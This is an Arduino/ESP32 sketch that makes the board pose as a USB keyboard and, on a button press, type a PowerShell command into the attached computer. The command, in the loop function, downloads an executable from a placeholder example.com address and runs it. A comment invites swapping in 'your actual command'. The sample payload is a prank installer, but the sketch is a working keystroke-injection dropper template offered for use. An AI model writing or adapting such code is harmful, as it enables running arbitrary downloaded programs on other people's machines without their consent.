#include <USB.h>
#include <USBHIDKeyboard.h>
#include <Arduino.h>
#include <SPI.h>
#include <WiFi.h>
#include <ezButton.h>
#include <TFT_eSPI.h>
#include <FastLED.h>

// Define your built-in button pin
#define BUTTON_PIN 0  

// Global flag to indicate USB readiness
volatile bool usbReady = false;

// Wrapper callback that matches the expected signature
void usbEventHandlerWrapper(void* arg, const char* event_base, int32_t event_id, void* event_data) {
  // The event_id corresponds to our arduino_usb_event_t values.
  switch (event_id) {
    case ARDUINO_USB_STARTED_EVENT:
      usbReady = true;
      Serial.println("USB Started. Device is ready.");
      break;
    case ARDUINO_USB_STOPPED_EVENT:
      usbReady = false;
      Serial.println("USB Stopped.");
      break;
    case ARDUINO_USB_SUSPEND_EVENT:
      Serial.println("USB Suspended.");
      break;
    case ARDUINO_USB_RESUME_EVENT:
      Serial.println("USB Resumed.");
      break;
    default:
      break;
  }
}

// Create instances for button, display, and keyboard.
ezButton button(BUTTON_PIN);
TFT_eSPI tft = TFT_eSPI(135, 240);
USBHIDKeyboard Keyboard;

void setup() {
  // Initialize TFT display
  tft.begin();
  tft.setRotation(1);
  tft.fillScreen(TFT_GOLD);

  // Initialize Serial for debugging.
  Serial.begin(115200);
  Serial.println("Initializing USB with event handler...");

  // Register the USB event handler using the wrapper.
  USB.onEvent(usbEventHandlerWrapper);

  // Start USB and HID keyboard.
  USB.begin();
  Keyboard.begin();

  // Optionally wait until USB is ready, up to 5 seconds.
  unsigned long timeout = millis() + 5000;
  while (!usbReady && millis() < timeout) {
    delay(10);
  }
  if (usbReady) {
    Serial.println("USB is ready.");
  } else {
    Serial.println("USB did not become ready within timeout.");
  }

  // Initialize button debouncer.
  button.setDebounceTime(50);
}

void sendKeystrokes(const char *text) {
  // Send each character with a slight delay.
  while (*text) {
    if (usbReady) {
      Keyboard.print(*text);
    }
    delay(5);
    text++;
  }
  if (usbReady) {
    Keyboard.write(KEY_RETURN);
  }
}

void loop() {
  // Update button state.
  button.loop();

  // Check if the button is pressed.
  if (button.isPressed()) {
    tft.fillScreen(TFT_GREEN);
    Serial.println("Button pressed. Sending HID payload...");

    // Example payload – replace with your actual command if needed.
    const char *payload = "powershell -Command \"Invoke-WebRequest -Uri 'https://example.com/DesktopGooseInstaller.exe' -OutFile 'DesktopGooseInstaller.exe'; Start-Process './DesktopGooseInstaller.exe'\"";
    sendKeystrokes(payload);

    // Delay to prevent multiple triggers from one press.
    delay(1000);
    tft.fillScreen(TFT_GOLD);
  }
}
